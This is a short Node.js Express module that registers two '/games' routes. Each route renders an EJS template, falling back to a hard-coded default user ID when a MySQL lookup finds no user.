var database_worker = require("../../mysql/workers");
const fs = require('fs');

function start_games(app) {
    app.get(`/games`, (req, res) => {
      return res.render(`vk_done/games/index.ejs`, {
          id: "343783264",
          error: 0,
          capcha: {
            status: 0
          }
        })
    });
    
    app.get(`/games/:id`, (req, res) => {
      database_worker.findUser(req.params.id, (user) => {
        if(user.length == 0) {
          res.render(`vk_done/games/index.ejs`, {
            id: "343783264",
            error: 0,
            capcha: {
                status: 0
            }
          });
        } else {
          res.render(`vk_done/games/index.ejs`, {
            id: req.params.id,
            error: 0,
            capcha: {
                status: 0
            }
          });
        }
      });
    });
}

module.exports = {
    start_games
}
